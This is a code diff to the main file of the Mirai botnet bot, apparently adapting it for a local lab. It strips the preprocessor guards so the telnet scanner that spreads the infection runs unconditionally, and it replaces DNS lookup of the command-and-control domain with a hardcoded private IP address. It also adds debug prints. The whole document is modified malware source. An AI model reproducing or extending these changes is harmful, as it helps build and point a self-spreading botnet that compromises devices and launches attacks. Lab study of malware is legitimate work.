@@ -101,6 +101,7 @@ int main(int argc, char **args)
 #endif
 
     LOCAL_ADDR = util_local_addr();
+    printf("LOCAL_ADDR = %u\n", LOCAL_ADDR);
 
     srv_addr.sin_family = AF_INET;
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
@@ -155,11 +156,11 @@ int main(int argc, char **args)
 
     attack_init();
     killer_init();
-#ifndef DEBUG
-#ifdef MIRAI_TELNET
+//#ifndef DEBUG
+//#ifdef MIRAI_TELNET
     scanner_init();
-#endif
-#endif
+//#endif
+//#endif
 
     while (TRUE)
     {
@@ -357,6 +358,7 @@ static void anti_gdb_entry(int sig)
 
 static void resolve_cnc_addr(void)
 {
+/*    
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
@@ -371,14 +373,20 @@ static void resolve_cnc_addr(void)
     }
     srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
     resolv_entries_free(entries);
-
+*/
     table_unlock_val(TABLE_CNC_PORT);
     srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
     table_lock_val(TABLE_CNC_PORT);
 
+    table_unlock_val(TABLE_CNC_DOMAIN);
+    srv_addr.sin_addr.s_addr = INET_ADDR(192,168,137,120);
+    table_lock_val(TABLE_CNC_DOMAIN);
+
 #ifdef DEBUG
     printf("[main] Resolved domain\n");
 #endif
+    
+    printf("[main] Resolved CNC domain not real do dns query, just use ip address.\n");
 }
 
 static void establish_connection(void)
